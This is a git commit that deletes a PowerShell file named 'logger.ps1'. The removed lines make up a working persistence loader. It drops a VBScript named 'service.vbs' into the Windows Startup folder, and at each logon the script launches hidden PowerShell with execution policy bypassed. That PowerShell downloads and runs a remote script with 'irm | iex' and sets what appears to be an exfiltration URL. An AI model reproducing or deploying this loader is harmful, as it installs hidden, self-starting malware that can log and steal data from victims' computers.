f938e1e77e00e4820cca443bac729a877c127761
ElPichiii <90940144+ElPichiii@users.noreply.github.com>
2024-01-03 01:14:21 +0100

    Delete logger.ps1

--- logger.ps1
+++
@@ -1,7 +0,0 @@
-$vbs = @'
-Set WshShell = WScript.CreateObject("WScript.Shell")
-WScript.Sleep 200
-WshShell.Run "powershell.exe -NoP -Ep Bypass -W H -C $dc='https://t.ly/exQMG'; irm https://raw.githubusercontent.com/ElPichiii/test/main/script.ps1 | iex", 0, True
-'@
-$pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
-$vbs | Out-File -FilePath $pth -Force
